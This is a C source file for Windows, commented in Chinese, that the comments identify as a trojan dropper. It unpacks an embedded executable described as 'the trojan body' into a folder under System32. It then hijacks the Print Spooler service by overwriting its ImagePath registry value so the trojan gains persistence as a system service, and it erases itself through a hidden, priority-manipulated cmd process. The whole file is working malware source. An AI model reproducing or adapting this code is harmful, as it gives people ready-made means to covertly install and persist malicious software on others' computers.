#pragma once
#include "resource.h"
/*这个头文件中只有一句 
#define IDR_EXE1                        101
IDR_EXE1是需要释放的木马本体
*/
#include <Windows.h>
#define _CRT_SECURE_NO_WARNNINGS
#define SERPATH	"SYSTEM\\CurrentControlSet\\Services\\Spooler"
#define FOLDER	"\\SimpleFolder"
#define SERVER	"\\SimpleFolder\\Server.exe"

//释放DLL和Loader
BOOL ReleaseFile(const char* fname, HRSRC hRsrc);
//创建一个可用的文件夹
BOOL CreateFolder(char* path);
//写注册表实现自启动
BOOL Write2Register(char* fname);
//自删除
BOOL SelfDelete();

int main() {
	char fname[260] = { 0 };
	char path[260] = { 0 };
	CreateFolder(path);//创建一个文件夹
	memset(fname, 0, sizeof(fname));
	memcpy(fname, path, strlen(path));
	strcat(fname, SERVER);
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(101), TEXT("EXE"));
	ReleaseFile(fname, hRsrc);//释放Loader
	Write2Register(fname);//写注册表实现自启动
	SelfDelete();//自删除
}

//////////////////////////////////////////////////////////////////////////
//释放Server
BOOL ReleaseFile(const char* fname, HRSRC hRsrc) {
	if (hRsrc == NULL) {
		return FALSE;
	}
	//获取资源大小
	DWORD dwSize = SizeofResource(NULL, hRsrc);
	if (dwSize == 0) {
		return FALSE;
	}
	//加载资源
	HGLOBAL	gl = LoadResource(NULL, hRsrc);
	if (gl == NULL) {
		return FALSE;
	}

	//锁定资源
	LPVOID lp = LockResource(gl);
	if (lp == NULL) {
		return FALSE;
	}
	LPBYTE p = (LPBYTE)GlobalAlloc(GPTR, dwSize);//为数据分配空间
	CopyMemory((LPVOID)p, lp, dwSize);//复制资源数据
	HANDLE	fp = CreateFile((LPCSTR)fname, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	int nRet = 0;
	if (fp == INVALID_HANDLE_VALUE) {
		nRet = GetLastError();
	}
	DWORD dwWritten;
	if (!WriteFile(fp, (LPVOID)p, dwSize, &dwWritten, NULL)) {
		return FALSE;
	}
	CloseHandle(fp);//关闭句柄
	FreeResource(gl);//释放内存
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//写注册表实现自启动
//替换系统服务Spooler的执行路径，改为木马路径 
BOOL Write2Register(char* fname) {
	HKEY hKey = NULL;
	LONG nRet = RegOpenKey(HKEY_LOCAL_MACHINE, (LPSTR)SERPATH, &hKey);
	if (nRet != ERROR_SUCCESS) {
		return 0;
	}
	nRet = RegSetValueEx(hKey, (LPSTR)"ImagePath", NULL, REG_EXPAND_SZ, (PBYTE)fname, strlen(fname) + 1);
	if (nRet != ERROR_SUCCESS) {
		return 0;
	}
	RegCloseKey(hKey);
	return TRUE;
}
//////////////////////////////////////////////////////////////////////////
//自删除
BOOL SelfDelete() {
	char	szModule[260];
	char	szComspec[260];
	char	szParams[260];
	//获得此文件名
	if (GetModuleFileName(0, (LPSTR)szModule, 260) != 0 &&
		GetShortPathName((LPSTR)szModule, (LPSTR)szModule, 260) != 0 &&
		GetEnvironmentVariable(TEXT("COMSPEC"), (LPSTR)szComspec, 260) != 0) {
		//设置命令参数
		lstrcpy((LPSTR)szParams, TEXT(" /c del "));
		lstrcat((LPSTR)szParams, (LPSTR)szModule);
		lstrcat((LPSTR)szParams, TEXT(" > nul"));
		lstrcat((LPSTR)szComspec, (LPSTR)szParams);
		//填充结构体
		STARTUPINFO	si = { 0 };
		PROCESS_INFORMATION	pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;
		//为程序增加资源分配
		SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentProcess(), THREAD_PRIORITY_TIME_CRITICAL);
		//包含命令
		if (CreateProcess(0, (LPSTR)szComspec, 0, 0, 0, CREATE_SUSPENDED | DETACHED_PROCESS, 0, 0, &si, &pi)) {
			//暂停一直到该程序退出再执行
			SetPriorityClass(pi.hProcess, IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread, THREAD_PRIORITY_IDLE);
			//以低级别恢复此批处理
			ResumeThread(pi.hThread);
			return TRUE;
		}
		else {
			SetPriorityClass(GetCurrentProcess(), NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentProcess(), THREAD_PRIORITY_NORMAL);
		}
	}
	return FALSE;
}

//创建文件夹
BOOL CreateFolder(char* path) {
	memset(path, 0, 260);
	GetSystemDirectory((LPSTR)path, 260);
	strcat(path, FOLDER);
	BOOL bRet = FALSE;
	bRet = CreateDirectory((LPSTR)path, NULL);
	if (bRet) {
		return bRet;
	}
	memset(path, 0, 260);
	GetCurrentDirectory(260, (LPSTR)path);
	strcat(path, FOLDER);
	bRet = CreateDirectory((LPSTR)path, NULL);
	return bRet;
}